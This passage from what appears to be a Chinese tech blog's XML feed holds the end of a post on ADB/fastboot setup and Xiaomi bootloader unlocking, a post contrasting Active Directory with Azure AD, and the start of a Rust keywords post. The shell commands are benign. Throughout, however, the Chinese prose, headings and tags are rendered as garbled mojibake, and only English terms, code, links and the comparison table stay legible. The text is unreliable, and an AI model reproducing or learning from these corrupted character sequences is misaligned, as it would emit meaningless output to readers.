é©±åŠ¨å˜çš„å¯ç”¨å¦‚å›¾</p><p><img src="https://s2.loli.net/2022/03/01/b4Q5dCKzesGUO3h.png" class="lazyload" data-srcset="https://s2.loli.net/2022/03/01/b4Q5dCKzesGUO3h.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220301174005151"></p></li></ol></div><h2 id="å®‰è£…ADB">å®‰è£…ADB</h2><div class="story post-story"><p><a href="https://www.mediafire.com/file/7iaxnjqiptc3um7/platform-tools_r31.0.3-windows.zip/file">platform-tools_r31.0.3-windows.zip</a></p><ol><li>æ‰‹æœºå¼€å‘è€…é€‰é¡¹é‡Œè®¾ç½® USB è°ƒè¯•, OEMå¯åŠ¨ å</li><li>åœ¨platformæ–‡ä»¶å¤¹ä¸‹æ‰“å¼€æ§åˆ¶å°è¾“å…¥</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># æŸ¥çœ‹è®¾å¤‡</span>$ ./adb.exe devicesList of devices attached2b24874b        device<span class="token comment"># è¿›å…¥fastbootæ¨¡å¼</span>$./adb.exe <span class="token function">reboot</span> bootloader<span class="token comment"># ç­‰å¾…æ‰‹æœºè¿›å…¥fastbootå æŸ¥çœ‹fastbootä¿¡æ¯</span>$ ./fastboot.exe devices2b24874b        fastboot<span class="token comment"># æ‰‹æœºé‡å¯</span>$ ./fastboot.exe <span class="token function">reboot</span>Rebooting                                          OKAY <span class="token punctuation">[</span>  <span class="token number">0</span>.001s<span class="token punctuation">]</span>Finished. Total time: <span class="token number">0</span>.002s</code></pre></div><h2 id="ä½¿ç”¨miflash-unlock-è§£BLé”">ä½¿ç”¨miflash unlock è§£BLé”</h2><div class="story post-story"><p>æ­¤æ—¶ç™»å½•è´¦æˆ·å, å¯æ­£å¸¸è§£é”</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastboot </tag>
            
            <tag> é©±åŠ¨ </tag>
            
            <tag> miflash unlock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADä¸AADåŒºåˆ«å’Œè”ç³»</title>
      <link href="/posts/2036bda7/"/>
      <url>/posts/2036bda7/</url>
      
        <content type="html"><![CDATA[<h1>AD ä¸AAD çš„åŒºåˆ«ä¸è”ç³»</h1><blockquote><p>2022-01-07</p></blockquote><p>[TOC]</p><h2 id="ADæ˜¯ä»€ä¹ˆ">ADæ˜¯ä»€ä¹ˆ</h2><div class="story post-story"><p>Active Directory(AD) æ´»åŠ¨ç›®å½•</p><p>Active Directory (AD)æ˜¯ä¸€ä¸ªæ•°æ®åº“å’Œä¸€ç»„æœåŠ¡ï¼Œå°†ç”¨æˆ·ä¸ä»–ä»¬å®Œæˆå·¥ä½œæ‰€éœ€çš„ç½‘ç»œèµ„æºè¿æ¥èµ·æ¥ã€‚</p><p>æ´»åŠ¨ç›®å½•(Active Directory)ä¸»è¦æä¾›ä»¥ä¸‹åŠŸèƒ½ï¼š1ã€æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºç®¡ç†ï¼Œ2ã€ç”¨æˆ·æœåŠ¡ï¼Œ3ã€èµ„æºç®¡ç†ï¼Œ4ã€æ¡Œé¢é…ç½®ï¼Œ5ã€åº”ç”¨ç³»ç»Ÿæ”¯æ’‘ç­‰ã€‚</p><p><strong>ADï¼ˆActive Directoryï¼‰æ¦‚è¿°ï¼š</strong></p><p>ä¼ ç»ŸADä¾èµ–äºKerboseè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒKerboseåˆå«åšä¸‰å¤´ç‹—ï¼Œè¦æ±‚è®¡ç®—æœºã€ç”¨æˆ·å’ŒåŸŸæ§ä¸‰æ–¹éƒ½è¦å‚ä¸éªŒè¯ã€‚å› æ­¤ï¼Œåœ¨ä¼ ç»ŸADä¸­ï¼Œè®¡ç®—æœºä¹Ÿæ‹¥æœ‰è´¦å·ï¼Œä¹Ÿéœ€è¦åŠ åŸŸã€‚å¦å¤–ï¼Œè®¡ç®—æœºä¹Ÿæœ‰ç™»å½•åˆ°åŸŸçš„è¿‡ç¨‹ï¼Œç”šè‡³å¯ä»¥æˆæƒè®¡ç®—æœºè´¦å·è®¿é—®æ–‡ä»¶å¤¹å’Œå…¶ä»–èµ„æºã€‚åœ¨ä¼ ç»ŸADä¸­ï¼Œæ‰€æœ‰ä»¥Local Systemã€Network Serviceèº«ä»½è¿è¡Œçš„æœåŠ¡åœ¨è®¿é—®åŸŸä¸­å…¶ä»–å…±äº«èµ„æºæ—¶ï¼Œéƒ½æ˜¯ä»¥è®¡ç®—æœºè´¦æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯çš„ã€‚</p><p>ä¼ ç»ŸADçš„ç™»å½•ä¼šç”±ç”¨æˆ·å‘åŸŸæ§ç”³è¯·å’Œè®¡ç®—æœºä¹‹é—´é€šä¿¡çš„ä¼šè¯ç¥¨æ®(é»˜è®¤å­˜æ´»8å°æ—¶)ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ï¼Œå‘è®¡ç®—æœºå‡ºç¤ºä¼šè¯ç¥¨æ®ï¼ŒåŒæ—¶åŠ ä¸Šæ—¶é—´æˆ³è¯æ˜æ²¡æœ‰ç¯¡æ”¹è¿‡ï¼Œè®¡ç®—æœºæ‰ä¼šæˆæƒç”¨æˆ·ç™»å½•ã€‚ç™»å½•ä»¥åï¼Œä¼šåœ¨è¯¥è®¡ç®—æœºä¸Šç”Ÿæˆç™»å½•ä¼šè¯ï¼Œå¹¶æŸ¥è¯¢è¯¥ç”¨æˆ·æ‰€å±çš„åŸŸç»„å’Œæœ¬åœ°ç»„ï¼Œä»¥æ­¤æ¥åˆ›å»ºè®¿é—®ä»¤ç‰Œï¼Œå¦‚æœæ˜¯æœ¬åœ°ç®¡ç†å‘˜ï¼Œåˆ™ä¼šç”Ÿæˆ2å¼ è®¿é—®ä»¤ç‰Œ(æ™®é€šç”¨æˆ·ä»¤ç‰Œå’Œç®¡ç†å‘˜ä»¤ç‰Œ)ã€‚</p><p>ä¼ ç»ŸADåè®®(å¦‚Kerboseå’ŒLDAPï¼‰å¤ªæ²‰é‡ï¼Œä¸€èˆ¬åªèƒ½é€‚åˆå†…ç½‘C/Sæ¶æ„ï¼Œæ— æ³•ç©¿é€Internetã€‚å¦‚æœè¦ç©¿é€Internetï¼Œé€šå¸¸è¦å°†å…¶è½¬ä¸ºåŸºäºClaimçš„å½¢å¼ï¼Œä¾‹å¦‚ADFSã€‚ADFSç±»ä¼¼äºè°ƒåˆ¶è§£è°ƒå™¨ï¼Œèƒ½å¤ŸæŠŠKerboseåè®®&quot;è½¬æ¢&quot;ä¸ºå…¶ä»–InternetéªŒè¯åè®®(SAMLç­‰)ï¼Œä½†è¿™å…¶å®å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„&quot;è½¬æ¢&quot;ã€‚</p><h3 id="ADDS-æ˜¯ä»€ä¹ˆ">ADDS æ˜¯ä»€ä¹ˆ</h3><blockquote><p><a href="https://www.quest.com/solutions/active-directory/what-is-active-directory.aspx">What is Active Directory?</a></p></blockquote><p>Active Directory Domain Services (AD DS) åŸŸæ§æœåŠ¡</p><p>è¿è¡ŒAD DSçš„æœåŠ¡å™¨ç§°ä¸ºåŸŸæ§åˆ¶å™¨(DCs, domain controllers)</p><p>ç»„ç»‡é€šå¸¸å…·æœ‰å¤šä¸ªDCSï¼Œæ¯ä¸ªç»„ç»‡éƒ½æœ‰ä¸€ä¸ªç”¨äºæ•´ä¸ªåŸŸçš„ç›®å½•çš„å‰¯æœ¬ã€‚å¯¹ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ä¸Šçš„ç›®å½• - ä¾‹å¦‚å¯†ç æ›´æ–°æˆ–åˆ é™¤ç”¨æˆ·å¸æˆ·çš„æ›´æ”¹å°†å¤åˆ¶åˆ°å…¶ä»–DCSï¼Œä»¥ä¾¿å®ƒä»¬ä¿æŒæœ€æ–°çŠ¶æ€ã€‚å…¨å±€ç›®å½•æœåŠ¡å™¨æ˜¯ä¸€ä¸ªDCï¼Œå®ƒå­˜å‚¨å…¶åŸŸç›®å½•ä¸­çš„æ‰€æœ‰å¯¹è±¡çš„å®Œæ•´å‰¯æœ¬ä»¥åŠæ£®æ—ä¸­æ‰€æœ‰å…¶ä»–åŸŸçš„æ‰€æœ‰å¯¹è±¡çš„éƒ¨åˆ†å‰¯æœ¬;è¿™ä½¿ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨å…¶æ—çš„ä»»ä½•åŸŸä¸­æŸ¥æ‰¾å¯¹è±¡ã€‚æ¡Œé¢ï¼Œç¬”è®°æœ¬ç”µè„‘å’Œè¿è¡ŒWindowsï¼ˆè€Œä¸æ˜¯Windows Serverï¼‰çš„å…¶ä»–è®¾å¤‡å¯ä»¥æ˜¯Active Directoryç¯å¢ƒçš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒä»¬ä¸ä¼šè¿è¡ŒAD DSã€‚AD DSä¾èµ–äºå¤šç§å»ºç«‹çš„åè®®å’Œæ ‡å‡†ï¼ŒåŒ…æ‹¬LDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ï¼ŒKerberoså’ŒDNSï¼ˆåŸŸåç³»ç»Ÿï¼‰ã€‚</p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-02-23-AD%E4%B8%8EAAD%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB/NLRxYiBq9S2s7mX.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-02-23-AD%E4%B8%8EAAD%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB/NLRxYiBq9S2s7mX.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220107150308606"></p></div><h2 id="AADæ˜¯ä»€ä¹ˆ">AADæ˜¯ä»€ä¹ˆ</h2><div class="story post-story"><p>Azure Active Directory (Azure AD)</p><p>æ˜¯ Microsoft <font color='red'>åŸºäºäº‘çš„èº«ä»½å’Œè®¿é—®ç®¡ç†æœåŠ¡</font>ï¼Œå¯å®ç°çš„å‘˜å·¥ç™»å½•å’Œè®¿é—® Azure ä¸­çš„èµ„æºï¼š</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/azure/active-directory/fundamentals/active-directory-whatis">What is Azure Active Directory</a></p></blockquote><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-02-23-AD%E4%B8%8EAAD%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB/3ghsbeXnqIjmiSu.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-02-23-AD%E4%B8%8EAAD%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB/3ghsbeXnqIjmiSu.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220107150447019"></p><p><strong>AADï¼ˆAzure Active Directoryï¼‰æ¦‚è¿°</strong></p><p>Azure æä¾›é€šè¿‡AADç®¡ç†èº«ä»½éªŒè¯å’Œæˆæƒçš„æœåŠ¡ï¼ŒAADæ˜¯ä¸€ç§åŸºäºäº‘çš„æ ‡è¯†æœåŠ¡ï¼Œç®¡ç†å‘˜å’Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨Azure ADé…ç½®çš„é›†ä¸­å¼è§„åˆ™å’Œç­–ç•¥æ¥æ§åˆ¶å¯¹å†…éƒ¨å’Œå¤–éƒ¨æ•°æ®åŠåº”ç”¨ç¨‹åºçš„è®¿é—®ã€‚  AADæ”¯æŒå¸¸è§çš„InternetéªŒè¯åè®®ï¼Œä¾‹å¦‚WS-Federationã€SAMLç­‰è½»é‡çº§çš„åŸºäºClaimçš„éªŒè¯åè®®ã€‚ä¸ä¼ ç»ŸADç±»ä¼¼ï¼ŒAADåŒæ ·æœ‰è®¿é—®ä»¤ç‰Œï¼Œä¸è¿‡å…¶ä¸­çš„å†…å®¹æ˜¯Claimå±æ€§ï¼Œè€Œä¸”ç”±äºéœ€è¦åœ¨Internetä¸Šäº¤ä»˜ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶è¿›è¡Œæ•°å­—ç­¾åå’ŒåŠ å¯†ã€‚ä¸‹é¢æ˜¯AADä¸»è¦åŒ…å«çš„å››ä¸ªæœåŠ¡ï¼š</p><ul><li><p>èº«ä»½éªŒè¯ï¼š åŒ…æ‹¬éªŒè¯èº«ä»½ä»¥è®¿é—®åº”ç”¨ç¨‹åºå’Œèµ„æºã€è‡ªåŠ©å¯†ç é‡ç½®ã€å¤šé‡èº«ä»½éªŒè¯ï¼ˆMFAï¼‰ç­‰åŠŸèƒ½ã€‚</p></li><li><p>å•ä¸€ç™»å½•ï¼ˆSSOï¼‰ï¼šç”¨æˆ·åªéœ€è®°ä½ä¸€ä¸ªIDå’Œä¸€ä¸ªå¯†ç å³å¯è®¿é—®å¤šä¸ªåº”ç”¨ç¨‹åºã€‚</p></li><li><p>åº”ç”¨ç¨‹åºç®¡ç†ï¼šå¯ä»¥ä½¿ç”¨AADåº”ç”¨ç¨‹åºä»£ç†ã€SSOã€â€œè®¿é—®â€é¢æ¿å’ŒSaaSåº”ç”¨æ¥ç®¡ç†äº‘åº”ç”¨å’Œæœ¬åœ°åº”ç”¨ã€‚</p></li><li><p>è®¾å¤‡ç®¡ç†ï¼šç®¡ç†äº‘è®¾å¤‡æˆ–æœ¬åœ°è®¾å¤‡è®¿é—®ä¼ä¸šæ•°æ®çš„æ–¹å¼</p></li></ul><h3 id="AADDSæ˜¯ä»€ä¹ˆ">AADDSæ˜¯ä»€ä¹ˆ</h3><p>Azure Active Directory Domain Services( Azure AD DS)<font color='red'> æä¾›æ‰˜ç®¡åŸŸæœåŠ¡</font></p><p>ç±»ä¼¼ADDSï¼Œä¾‹å¦‚åŸŸåŠ å…¥ã€ç»„ç­–ç•¥ã€è½»å‹ç›®å½•è®¿é—®åè®® (LDAP) å’Œ Kerberos/NTLM èº«ä»½éªŒè¯ã€‚ æ— éœ€åœ¨äº‘ä¸­éƒ¨ç½²ã€ç®¡ç†å’Œä¿®è¡¥åŸŸæ§åˆ¶å™¨ (DC) å³å¯ä½¿ç”¨è¿™äº›åŸŸæœåŠ¡ã€‚</p><p>Azure AD DS æ‰˜ç®¡åŸŸä½¿ä½ èƒ½å¤Ÿåœ¨äº‘ä¸­æˆ–ä½ ä¸å¸Œæœ›ç›®å½•æŸ¥æ‰¾å§‹ç»ˆè¿”å›åˆ°æœ¬åœ° AD DS ç¯å¢ƒçš„ä½ç½®ï¼Œè¿è¡Œæ— æ³•ä½¿ç”¨ç°ä»£èº«ä»½éªŒè¯æ–¹æ³•çš„æ—§ç‰ˆåº”ç”¨ç¨‹åºã€‚ ä½ å¯ä»¥å°†è¿™äº›æ—§ç‰ˆåº”ç”¨ç¨‹åºä»æœ¬åœ°ç¯å¢ƒç›´æ¥è¿ç§»åˆ°æ‰˜ç®¡åŸŸï¼Œè€Œæ— éœ€åœ¨äº‘ä¸­ç®¡ç† AD DS ç¯å¢ƒã€‚</p><p>Azure AD DS ä¸ç°æœ‰çš„ Azure AD ç§Ÿæˆ·é›†æˆã€‚ é€šè¿‡æ­¤é›†æˆï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å…¶ç°æœ‰å‡­æ®ç™»å½•åˆ°ä¸æ‰˜ç®¡åŸŸç›¸è¿çš„æœåŠ¡å’Œåº”ç”¨ç¨‹åºã€‚ è¿˜å¯ä»¥ä½¿ç”¨ç°æœ‰ç»„å’Œç”¨æˆ·å¸æˆ·æ¥ä¿æŠ¤å¯¹èµ„æºçš„è®¿é—®ã€‚ è¿™äº›åŠŸèƒ½å¯æ›´é¡ºç•…åœ°å°†æœ¬åœ°èµ„æºç›´æ¥è¿ç§»åˆ° Azureã€‚</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/azure/active-directory-domain-services/overview">ä»€ä¹ˆæ˜¯ Azure Active Directory åŸŸæœåŠ¡</a></p></blockquote></div><h2 id="ADä¸AADçš„åŒºåˆ«ä¸è”ç³»">ADä¸AADçš„åŒºåˆ«ä¸è”ç³»</h2><div class="story post-story"><blockquote><p><a href="https://docs.microsoft.com/zh-cn/azure/active-directory/fundamentals/active-directory-compare-azure-ad-to-ad">å°† Active Directory ä¸ Azure Active Directory è¿›è¡Œæ¯”è¾ƒ</a></p></blockquote><p><img src="https://s2.loli.net/2022/04/10/SXokAZFt3dbnfr8.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/10/SXokAZFt3dbnfr8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220107150753638"></p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-02-23-AD%E4%B8%8EAAD%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB/8e1qBxAPUYCp3Wh.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-02-23-AD%E4%B8%8EAAD%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB/8e1qBxAPUYCp3Wh.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220107185446160"></p><h3 id="ADå’ŒAADçš„åŒºåˆ«">ADå’ŒAADçš„åŒºåˆ«</h3><pre><code>    AADä¸ä¼ ç»ŸADæ˜¯å®Œå…¨ä¸åŒçš„ï¼Œå‰è€…æ˜¯äº‘æœåŠ¡ï¼Œåªç®¡éªŒè¯ä¸æˆæƒ, è€ŒAADæ›´åƒæ˜¯ä¼ ç»ŸADå‘äº‘ç«¯çš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨ä»¥æ»¡è¶³æ›´å¤šçš„åº”ç”¨åœºæ™¯ä¸éªŒè¯éœ€æ±‚ã€‚AAD é€šè¿‡ä¸ºç»„ç»‡æä¾›ä¸€ç§é€‚ç”¨äºåœ¨äº‘ä¸­å’Œæœ¬åœ°æ‰€æœ‰åº”ç”¨çš„æ ‡è¯†å³æœåŠ¡è§£å†³æ–¹æ¡ˆï¼Œå°†ç›®å½•æœåŠ¡æ–¹æ¡ˆæå‡åˆ°äº†ä¸€ä¸ªæ–°å±‚æ¬¡ã€‚åŒæ—¶ï¼ŒAADæ˜¯åŸºäºäº‘çš„èº«ä»½å’Œè®¿é—®ç®¡ç†è§£å†³æ–¹æ¡ˆï¼Œå®ƒä¹Ÿå¯ä»¥ä¸æœ¬åœ°ADåŒæ­¥ï¼Œä¸ºæœ¬åœ°å’ŒåŸºäºäº‘çš„ç³»ç»Ÿæä¾›èº«ä»½éªŒè¯ã€‚AADç›¸è¾ƒäºADçš„æ‰©å±•åŠŸèƒ½æ¦‚è¿°å¦‚ä¸‹ï¼š</code></pre><ol><li><p><strong>AAD è§£å†³äº†ä¼ ç»ŸADæ— æ³•æ‰©å±•åˆ°å¤–éƒ¨çš„å±€é™æ€§é—®é¢˜</strong>ã€‚ä¼ ç»ŸADåœ¨éªŒè¯å’Œæˆæƒæ–¹é¢æ›´å¤šçš„æ˜¯åšéªŒè¯ï¼Œå¹¶ä¸”æ— æ³•æ‰©å±•åˆ°å¤–éƒ¨ï¼ˆå—é™äºKerboseå’ŒLDAPï¼‰ï¼Œåªèƒ½å±€é™åœ¨ä¼ä¸šç¯å¢ƒã€‚è€ŒAADæ°å¥½èƒ½å¤Ÿè§£å†³è¿™ä¸€é—®é¢˜ï¼Œå®ƒæ”¯æŒå¦‚OAuth2ã€SAMLã€WS-Federationå’ŒOpenIDç­‰è½»é‡çº§çš„åŸºäºClaimçš„éªŒè¯åè®®ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†Restæ¥å£ã€‚</p></li><li><p><strong>AAD æ›´å…³æ³¨äºéªŒè¯ä¸æˆæƒ</strong>ã€‚é™¤å»éªŒè¯ï¼Œä¼ ç»ŸADæ›´å…³æ³¨äºèµ„æºçš„å‘ç°ä¸ç®¡ç†ï¼Œå¦‚æœ€å¸¸ç”¨çš„ç»„ç­–ç•¥ï¼Œè€Œè¿™éƒ¨åˆ†å†…å®¹åœ¨AADé‡Œæ˜¯ä¸å…³æ³¨çš„ï¼ŒAADå…³æ³¨çš„æ˜¯éªŒè¯ä¸æˆæƒï¼Œè€Œéç®¡ç†æœ¬èº«ã€‚</p></li><li><p><strong>AAD é€šè¿‡å¤šé‡èº«ä»½éªŒè¯å’Œæ— å¯†ç æŠ€æœ¯æé«˜äº†å¯†ç å®‰å…¨æ€§</strong>ã€‚ä¼ ç»ŸADä¸­çš„å‡­æ®åŸºäºå¯†ç ã€è¯ä¹¦æˆ–æ™ºèƒ½å¡çš„èº«ä»½éªŒè¯ï¼Œé€šè¿‡å¯†ç ç­–ç•¥æ¥ç®¡ç†å¯†ç çš„é•¿åº¦ã€åˆ°æœŸæ—¶é—´å’Œå¤æ‚æ€§ï¼Œä»¥æ­¤ç¡®ä¿ADä¸­å¯†ç çš„å®‰å…¨æ€§ï¼›è€ŒAADå¯¹äº‘å’Œæœ¬åœ°ä½¿ç”¨æ™ºèƒ½å¯†ç ä¿æŠ¤ï¼ŒAADé€šè¿‡å¤šé‡èº«ä»½éªŒè¯å’Œæ— å¯†ç æŠ€æœ¯æ˜¾è‘—çš„æé«˜äº†å¯†ç å®‰å…¨æ€§ï¼ŒåŒæ—¶ä¹Ÿä¸ºç”¨æˆ·æä¾›äº†è‡ªåŠ©é‡ç½®å¯†ç çš„åŠŸèƒ½æ¥æå‡ç”¨æˆ·ä½“éªŒï¼Œé™ä½æŠ€æœ¯æ”¯æŒæˆæœ¬ã€‚</p></li><li><p><strong>AAD ä½¿ç”¨AADåº”ç”¨ç¨‹åºä»£ç†è®¿é—®æœ¬åœ°åº”ç”¨</strong>ã€‚ADå½“ä¸­å¤§å¤šæ•°æœ¬åœ°åº”ç”¨éƒ½ä½¿ç”¨LDAPã€NTLMæˆ–kerberosåè®®æ¥æ§åˆ¶ç”¨æˆ·çš„è®¿é—®ã€‚AADåˆ™å¯ä½¿ç”¨åœ¨æœ¬åœ°è¿è¡Œçš„AADåº”ç”¨ç¨‹åºä»£ç†æ¥è®¿é—®è¿™äº›ç±»å‹çš„æœ¬åœ°åº”ç”¨ã€‚</p></li><li><p><strong>AAD å®Œå…¨åŸºäºäº‘</strong>ã€‚AAD çš„ä¼˜åŠ¿åœ¨äºå®ƒå®Œå…¨åŸºäºäº‘æ‰€æä¾›çš„çµæ´»æ€§ï¼Œè¿™æ„å‘³ç€å®ƒæ—¢å¯ä»¥å……å½“ç»„ç»‡çš„å”¯ä¸€ç›®å½•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ AAD Connect ä¸æœ¬åœ°ADç›®å½•æœåŠ¡åŒæ­¥ã€‚æ— è®ºé‡‡å–å“ªç§æ–¹å¼ï¼Œå®ƒéƒ½ä½¿æœ¬åœ°å’ŒåŸºäºäº‘çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®ç›¸åŒçš„åº”ç”¨ç¨‹åºå’Œèµ„æºï¼ŒåŒæ—¶å—ç›Šäºè¯¸å¦‚å•ç‚¹ç™»å½• (SSO)ã€å¤šé‡èº«ä»½éªŒè¯ (MFA)ã€æ¡ä»¶è®¿é—®ç­‰åŠŸèƒ½ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªå•ä¸€ä½ç½®æ¥ç®¡ç†æ•´ä¸ª IT èµ„äº§ä¸­çš„èº«ä»½ã€å®‰å…¨æ€§å’Œåˆè§„æ€§æ§åˆ¶ã€‚</p><p>ä¸‹è¡¨å±•ç¤ºäº†ADä¸AADçš„å…·ä½“åŒºåˆ«ï¼š</p></li></ol><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">On-Premises Active Directory</th><th style="text-align:center">Azure Active Directory</th></tr></thead><tbody><tr><td style="text-align:center">Authentication</td><td style="text-align:center">kerberos</td><td style="text-align:center">A number of protocols such as SAMLï¼ŒWS-Federation and OAuthï¼ŒOIDC</td></tr><tr><td style="text-align:center">Locator mechanism</td><td style="text-align:center">DNS</td><td style="text-align:center">âœ—</td></tr><tr><td style="text-align:center">Structure</td><td style="text-align:center">Hierarchical(based on X.500)</td><td style="text-align:center">Flat</td></tr><tr><td style="text-align:center">Query</td><td style="text-align:center">LDAP</td><td style="text-align:center">A rest API, called AD Graph API</td></tr><tr><td style="text-align:center">Communication types</td><td style="text-align:center">All kinds of types</td><td style="text-align:center">HTTP(port 80) HTTP(port 443)</td></tr><tr><td style="text-align:center">Devices</td><td style="text-align:center">Corporate assets, mostly PC</td><td style="text-align:center">BYOD</td></tr><tr><td style="text-align:center">Focus on</td><td style="text-align:center">On-perm services</td><td style="text-align:center">Internet-based services, such as O365, Azure and Facebook(Any services federated with Azure AD)</td></tr><tr><td style="text-align:center">Domain joined</td><td style="text-align:center">âœ“</td><td style="text-align:center">âœ—</td></tr><tr><td style="text-align:center">User</td><td style="text-align:center">âœ“</td><td style="text-align:center">âœ“</td></tr><tr><td style="text-align:center">Group</td><td style="text-align:center">âœ“</td><td style="text-align:center">âœ“</td></tr><tr><td style="text-align:center">OU</td><td style="text-align:center">âœ“</td><td style="text-align:center">âœ—</td></tr><tr><td style="text-align:center">GPO</td><td style="text-align:center">âœ“</td><td style="text-align:center">âœ—</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Azure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Azure </tag>
            
            <tag> å¾®è½¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rustå­¦ä¹ 4-å…³é”®å­—</title>
      <link href="/posts/8358a15/"/>
      <url>/posts/8358a15/</url>
      
        <content type="html"><![CDATA[<h2 id="å…³é”®å­—">å…³é”®å­—</h2><div class="story post-story"><p>ä¸‹é¢çš„åˆ—è¡¨åŒ…å« Rust ä¸­æ­£åœ¨ä½¿ç”¨æˆ–è€…ä»¥åä¼šç”¨åˆ°çš„å…³é”®å­—ã€‚å› æ­¤ï¼Œè¿™äº›å…³é”®å­—ä¸èƒ½è¢«ç”¨ä½œæ ‡è¯†ç¬¦ï¼ˆé™¤äº† â€œ<a href="https://kaisery.github.io/trpl-zh-cn/appendix-01-keywords.html#%E5%8E%9F%E5%A7%8B%E6%A0%87%E8%AF%86%E7%AC%A6">åŸå§‹æ ‡è¯†ç¬¦</a>â€ éƒ¨åˆ†ä»‹ç»çš„åŸå§‹æ ‡è¯†ç¬¦ï¼‰ï¼Œè¿™åŒ…æ‹¬å‡½æ•°ã€å˜é‡ã€å‚æ•°ã€ç»“æ„ä½“å­—æ®µã€æ¨¡å—ã€crateã€å¸¸é‡ã€å®ã€é™æ€å€¼ã€å±æ€§ã€ç±»å‹ã€trait æˆ–ç”Ÿå‘½å‘¨æœŸ çš„åå­—ã€‚</p><h3 id="ç›®å‰æ­£åœ¨ä½¿ç”¨çš„å…³é”®å­—">ç›®å‰æ­£åœ¨ä½¿ç”¨çš„å…³é”®å­—</h3><p>å¦‚ä¸‹å…³é”®å­—ç›®å‰æœ‰å¯¹åº”å…¶æè¿°çš„åŠŸèƒ½ã€‚</p><ul><li><code>as</code> - å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæ¶ˆé™¤ç‰¹å®šåŒ…å«é¡¹çš„ trait çš„æ­§ä¹‰ï¼Œæˆ–è€…å¯¹ <code>use</code> å’Œ <code>extern crate</code> è¯­å¥ä¸­çš„é¡¹é‡å‘½å</li><li><code>async</code> - è¿”å›ä¸€ä¸ª <code>Future</code> è€Œä¸æ˜¯é˜»å¡å½“å‰çº¿ç¨‹</li><li><code>await</code> - æš‚åœæ‰§è¡Œç›´åˆ° <code>Future</code> çš„ç»“æœå°±ç»ª</li><li><code>break</code> - ç«‹åˆ»é€€å‡ºå¾ªç¯</li><li><code>const</code> - å®šä¹‰å¸¸é‡æˆ–ä¸å˜è£¸æŒ‡é’ˆï¼ˆconstant raw pointerï¼‰</li><li><code>continue</code> - ç»§ç»­è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯è¿­ä»£</li><li><code>crate</code> - <strong>é“¾æ¥ï¼ˆlinkï¼‰ä¸€ä¸ªå¤–éƒ¨ crate æˆ–ä¸€ä¸ªä»£è¡¨å®å®šä¹‰çš„ crate çš„å®å˜é‡</strong></li><li><code>dyn</code> - <strong>åŠ¨æ€åˆ†å‘ trait å¯¹è±¡</strong></li><li><code>else</code> - ä½œä¸º <code>if</code> å’Œ <code>if let</code> æ§åˆ¶æµç»“æ„çš„ fallback</li><li><code>enum</code> - å®šä¹‰ä¸€ä¸ªæšä¸¾</li><li><code>extern</code> - é“¾æ¥ä¸€ä¸ªå¤–éƒ¨ <strong>crate</strong> ã€å‡½æ•°æˆ–å˜é‡</li><li><code>false</code> - å¸ƒå°”å­—é¢å€¼ <code>false</code></li><li><code>fn</code> - å®šä¹‰ä¸€ä¸ªå‡½æ•°æˆ– <strong>å‡½æ•°æŒ‡é’ˆç±»å‹</strong> (<em>function pointer type</em>)</li><li><code>for</code> - 